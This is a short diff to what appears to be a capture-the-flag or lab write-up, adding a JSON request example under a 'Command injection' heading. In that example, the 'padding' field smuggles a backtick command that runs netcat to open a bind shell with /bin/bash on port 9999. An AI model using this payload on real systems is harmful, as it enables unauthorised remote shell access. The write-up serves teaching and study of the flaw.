@@ -104,6 +104,10 @@ So we can put together this Logic error and command injection.
 ## Command injection
 
 ![cmdi2](images/cmdi2.png) 
+```
+{"id":"1","bullian":"192","recvip":"172.17.0.10","padding":"`nc -e /bin/bash -llvp 9999 1>/dev/null 2>/dev/null`"}
+```
+
 
 <br>
 
